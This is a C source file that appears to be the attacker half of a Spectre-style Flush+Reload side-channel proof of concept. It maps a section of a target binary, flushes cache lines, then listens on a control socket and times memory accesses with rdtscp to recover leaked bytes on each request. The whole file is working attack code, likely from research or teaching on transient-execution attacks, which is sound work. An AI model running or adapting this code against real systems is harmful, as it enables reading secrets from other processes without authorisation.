
#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <errno.h>
#include <ctype.h>

#include <emmintrin.h>
#include <x86intrin.h>

#include "common.h"
#include "spectre.h"

int x;

int main(int argc, char *argv[])
{
    printf("Attack pid = %d\n", getpid());
    int err;
    if (argc < 2)
    {
        fprintf(stderr, "Usage: %s <binname>\n", argv[0]);
        return EXIT_FAILURE;
    }

    uint8_t *array = mapsection(argv[1], TARGET_SECTION, ARRSIZE);
    if (!array)
        return EXIT_FAILURE;

    uint64_t threshold = calculate_threshold(1000000);

    // Read the array in memory
    for (int i = 0; i < 256; i++)
        x &= array[i*4096 + OFFSET];
    for (int i = 0; i < 256; i++)
        _mm_clflush(&array[i*4096 + OFFSET]);

    int sock = setup_server(CONTROL_PORT);
    if (sock < 0)
    {
        munmap(array, ARRSIZE);
        return EXIT_FAILURE;
    }

    int master = accept(sock, NULL, NULL);
    if (master  < 0)
    {
        perror("accept");
        munmap(array, ARRSIZE);
        return EXIT_FAILURE;
    }
    printf("Master connected, starting\n");

    err = 1;
    while (err > 0)
    {

        uint8_t requests[REQUEST_SIZE] = {};
        err = recv(master, requests, sizeof(requests), 0);
        usleep(100);

        int found = 0;
        char sym  = '\0';
        int  idx  = 0;
        for (int i = 1; i < 200; i++)
        {
            unsigned junk = 0;

            uint64_t start, finish;
            start  = __rdtscp(&junk);
            x = array[i*4096 + OFFSET];
            finish = __rdtscp(&junk);

            uint64_t duration = finish - start;
            // if (duration < 200)
            if (duration < threshold)
            {
                // printf("%3d : %lu ", i, duration);
                // printf("%c\n", (isalnum(i) ? i : '?'));
                sym = (isalnum(i) ? i : '?');
                idx = i;
                found = 1;
            }
        }
        printf("Offset %3d: %c (%d)\n", requests[REQUEST_SIZE - 1], sym, idx);
        err = send(master, &found, sizeof(found), 0);
    }

    munmap(array, ARRSIZE);
    return EXIT_SUCCESS;
}

